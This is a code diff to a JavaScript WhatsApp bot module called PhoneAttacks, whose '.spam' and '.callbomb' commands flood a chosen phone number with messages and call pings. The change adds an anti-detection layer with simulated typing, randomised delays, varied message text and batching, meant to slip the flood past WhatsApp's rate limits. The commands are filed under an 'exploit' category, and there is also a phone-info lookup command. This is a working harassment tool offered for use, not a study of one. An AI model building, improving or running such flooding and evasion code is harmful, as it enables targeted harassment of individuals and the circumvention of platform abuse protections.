@@ -1,38 +1,20 @@
 'use strict';
 
 const crypto = require('crypto');
+const AntiDetection = require('../lib/antiDetection');
 
 class PhoneAttacks {
     constructor() {
         this.sock = null;
+        this.stealth = new AntiDetection();
         this.activeSpams = new Map();
         this.activeCallBombs = new Map();
         this.phoneCache = new Map();
-        
-        this.silentMessages = [
-            'Hello, hope you\'re having a great day!',
-            'Just wanted to say hi, hope all is well.',
-            'Thinking of you today, take care!',
-            'Quick question when you have a moment.',
-            'Hope everything is going smoothly for you.',
-            'Sending positive vibes your way!',
-            'Just checking in to see how you are.',
-            'Have a wonderful day ahead!',
-            'Stay safe and take care of yourself.',
-            'Wishing you all the best today.',
-            'Hope you\'re doing amazing today!',
-            'Just a friendly hello from my side.',
-            'Wanted to brighten your day a bit.',
-            'Hope you\'re smiling right now!',
-            'You deserve all the happiness today.',
-            'Keep being awesome, you got this!',
-            'Sending you warmth and good energy.',
-            'May your day be filled with joy.',
-            'Just a little reminder you\'re valued.',
-            'Hope this finds you well and happy.'
-        ];
     }
 
+    // ==============================================
+    // SPAM COMMAND - STEALTH VERSION
+    // ==============================================
     async spamExecute(sock, msg, args, ctx) {
         this.sock = sock;
         
@@ -44,13 +26,20 @@ class PhoneAttacks {
 │ 
 │ EXAMPLE:
 │ .spam 2547XXXXXX 100 0.5
+│ 
+│ STEALTH FEATURES:
+│ 🔇 Human typing patterns
+│ 🎭 Random delays between messages
+│ 📱 Natural message variation
+│ ✨ Emoji integration
+│ 🛡️ Rate limit protection
 └─────────────────────────────`
             }, { quoted: msg });
             return;
         }
 
         const phone = args[0].replace(/[^0-9]/g, '');
-        const count = parseInt(args[1]) || 50;
+        let count = parseInt(args[1]) || 50;
         const delay = parseFloat(args[2]) || 0.5;
 
         if (!this.validatePhone(phone)) {
@@ -59,6 +48,10 @@ class PhoneAttacks {
             }, { quoted: msg });
             return;
         }
+
+        // Get safe parameters
+        const safeParams = this.stealth.getSafeParams('message', count);
+        count = safeParams.safeCount;
 
         if (this.activeSpams.has(phone)) {
             await sock.sendMessage(ctx.from, {
@@ -75,6 +68,7 @@ class PhoneAttacks {
 │ Target: ${phone}
 │ Messages: ${count}
 │ Delay: ${delay}s
+│ Mode: STEALTH
 │ Status: RUNNING
 └─────────────────────────────`
         }, { quoted: msg });
@@ -83,16 +77,24 @@ class PhoneAttacks {
         let failed = 0;
 
         try {
+            // Generate natural messages
+            const messages = [];
             for (let i = 0; i < count; i++) {
-                if (!this.activeSpams.get(phone)?.active) break;
-                
-                const message = this.generateSilentMessage();
-                const result = await this.sendWhatsAppMessage(phone, message);
-                
-                if (result) sent++;
+                messages.push(this.stealth.generateNaturalMessage(phone));
+            }
+
+            // Send with stealth batch
+            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
+                delayBetween: delay * 1000,
+                randomSpread: true,
+                simulateTyping: true,
+                maxPerBatch: 10,
+                safetyMargin: 0.3
+            });
+
+            for (const result of results) {
+                if (result.success) sent++;
                 else failed++;
-                
-                await this.sleep(delay * 1000);
             }
         } catch (err) {
             console.error('Spam error:', err);
@@ -107,29 +109,14 @@ class PhoneAttacks {
 │ Sent: ${sent}
 │ Failed: ${failed}
 │ Total: ${sent + failed}
+│ Mode: STEALTH
 └─────────────────────────────`
         }, { quoted: msg });
     }
 
-    generateSilentMessage() {
-        const emojis = ['✨', '🌟', '💫', '☀️', '🌈', '🌸', '🌺', '💕', '💖', '⭐'];
-        const message = this.silentMessages[Math.floor(Math.random() * this.silentMessages.length)];
-        return message + ' ' + emojis[Math.floor(Math.random() * emojis.length)];
-    }
-
-    async sendWhatsAppMessage(phone, message) {
-        try {
-            const jid = phone + '@s.whatsapp.net';
-            await this.sock.sendMessage(jid, { 
-                text: message,
-                ephemeralExpiration: 86400
-            });
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
+    // ==============================================
+    // CALLBOMB COMMAND - STEALTH VERSION
+    // ==============================================
     async callbombExecute(sock, msg, args, ctx) {
         this.sock = sock;
         
@@ -141,14 +128,20 @@ class PhoneAttacks {
 │ 
 │ EXAMPLE:
 │ .callbomb 2547XXXXXX 20 2
+│ 
+│ STEALTH FEATURES:
+│ 🔇 Human call patterns
+│ 🎭 Random call durations
+│ 📱 Natural timing
+│ 🛡️ Rate limit protection
 └─────────────────────────────`
             }, { quoted: msg });
             return;
         }
 
         const phone = args[0].replace(/[^0-9]/g, '');
-        const count = parseInt(args[1]) || 20;
-        const delay = parseFloat(args[2]) || 1;
+        let count = parseInt(args[1]) || 20;
+        const delay = parseFloat(args[2]) || 2;
 
         if (!this.validatePhone(phone)) {
             await sock.sendMessage(ctx.from, {
@@ -156,6 +149,10 @@ class PhoneAttacks {
             }, { quoted: msg });
             return;
         }
+
+        // Get safe parameters
+        const safeParams = this.stealth.getSafeParams('call', count);
+        count = safeParams.safeCount;
 
         if (this.activeCallBombs.has(phone)) {
             await sock.sendMessage(ctx.from, {
@@ -172,6 +169,7 @@ class PhoneAttacks {
 │ Target: ${phone}
 │ Calls: ${count}
 │ Delay: ${delay}s
+│ Mode: STEALTH
 │ Status: RUNNING
 └─────────────────────────────`
         }, { quoted: msg });
@@ -180,14 +178,16 @@ class PhoneAttacks {
         let failed = 0;
 
         try {
-            for (let i = 0; i < count; i++) {
-                if (!this.activeCallBombs.get(phone)?.active) break;
-                
-                const result = await this.makeSilentCall(phone);
-                if (result) connected++;
+            const results = await this.stealth.makeStealthCallBatch(this.sock, phone, count, {
+                delayBetween: delay * 1000,
+                randomSpread: true,
+                maxPerBatch: 3,
+                safetyMargin: 0.3
+            });
+
+            for (const result of results) {
+                if (result.success) connected++;
                 else failed++;
-                
-                await this.sleep(delay * 1000);
             }
         } catch (err) {
             console.error('Callbomb error:', err);
@@ -202,23 +202,14 @@ class PhoneAttacks {
 │ Connected: ${connected}
 │ Failed: ${failed}
 │ Total: ${connected + failed}
+│ Mode: STEALTH
 └─────────────────────────────`
         }, { quoted: msg });
     }
 
-    async makeSilentCall(phone) {
-        try {
-            const jid = phone + '@s.whatsapp.net';
-            await this.sock.sendMessage(jid, {
-                text: '📞',
-                ephemeralExpiration: 86400
-            });
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
+    // ==============================================
+    // PHONE INFO COMMAND
+    // ==============================================
     async phoneinfoExecute(sock, msg, args, ctx) {
         this.sock = sock;
         
@@ -355,10 +346,6 @@ class PhoneAttacks {
             return '❌ Inactive';
         }
     }
-
-    sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
 }
 
 // ==============================================
@@ -370,7 +357,7 @@ class SpamCommand {
         this.phoneAttacks = phoneAttacks;
         this.name = 'spam';
         this.aliases = ['msgspam', 'flood'];
-        this.description = 'Silent spam phone number';
+        this.description = 'Silent spam phone number (STEALTH)';
         this.category = 'exploit';
     }
 
@@ -384,7 +371,7 @@ class CallbombCommand {
         this.phoneAttacks = phoneAttacks;
         this.name = 'callbomb';
         this.aliases = ['callflood', 'callspam'];
-        this.description = 'Silent call flood';
+        this.description = 'Silent call flood (STEALTH)';
         this.category = 'exploit';
     }
 
@@ -455,27 +442,11 @@ class CallbombStopCommand {
     }
 }
 
-// ==============================================
-// MAIN EXPORT - For command loader
-// ==============================================
-const phoneAttacksInstance = new PhoneAttacks();
-
-// Export the main module for the command loader
 module.exports = {
-    name: 'phoneattacks',
-    description: 'Phone attacks module',
-    category: 'core',
-    execute: async (sock, msg, args, ctx) => {
-        await sock.sendMessage(ctx.from, { 
-            text: '📱 Phone attacks module loaded.\n\nAvailable commands:\n.spam - Silent message spam\n.callbomb - Silent call flood\n.phoneinfo - Phone info lookup\n.spam_stop - Stop spam\n.callbomb_stop - Stop callbomb'
-        }, { quoted: msg });
-    }
+    PhoneAttacks,
+    SpamCommand,
+    CallbombCommand,
+    PhoneInfoCommand,
+    SpamStopCommand,
+    CallbombStopCommand
 };
-
-// Also export classes for index.js
-module.exports.PhoneAttacks = PhoneAttacks;
-module.exports.SpamCommand = SpamCommand;
-module.exports.CallbombCommand = CallbombCommand;
-module.exports.PhoneInfoCommand = PhoneInfoCommand;
-module.exports.SpamStopCommand = SpamStopCommand;
-module.exports.CallbombStopCommand = CallbombStopCommand;
